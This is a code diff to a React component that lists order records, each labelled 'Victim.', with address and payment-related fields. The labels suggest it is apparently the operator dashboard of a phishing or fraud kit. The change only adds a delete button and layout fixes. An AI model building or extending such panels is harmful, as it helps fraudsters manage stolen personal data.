@@ -1,6 +1,9 @@
-import React from "react";
-
-const Data = ({ OrderData }) => {
+import axios from "axios";
+import React, { useContext } from "react";
+import { MdDelete } from "react-icons/md";
+import { MainContext } from "../Main";
+const Data = ({ OrderData, deleteSubmitHandler }) => {
+  const { PaymentBaseUrl, BackendBaseUrl } = useContext(MainContext)
   // country: contry,
   // state: Province,
   // city: e.target.city.value,
@@ -16,16 +19,21 @@ const Data = ({ OrderData }) => {
   // zip: e.target.zip?.value,
   // cedex: e.target.cedex?.value,
   // district: e.target.district?.value,
+
+
   return (
 
     <div>
       {
-        OrderData.map((data, i) => {
+        OrderData?.map((data, i) => {
           return (
             <div key={i} className=" w-full mb-3 rounded-lg border shadow-md flex flex-col  ">
-              <div className="flex items-center justify-center px-4 py-3 gap-2">
-                <h1 className="font-semibold text-gray-500 ">Victim.</h1>
-                <h2 className="text-gray-500 font-semibold">{i + 1}</h2>
+              <div className="flex items-center justify-evenly px-4 py-3 gap-2">
+                <div className="flex items-center justify-center">
+                  <h1 className="font-semibold text-gray-500 ">Victim.</h1>
+                  <h2 className="text-gray-500 font-semibold">{i + 1}</h2>
+                </div>
+                <MdDelete className="text-black cursor-pointer hover:text-red-500" onClick={(e) => { deleteSubmitHandler(data._id) }} />
               </div>
               <hr />
               <div className="flex items-center px-4 py-2 gap-2">
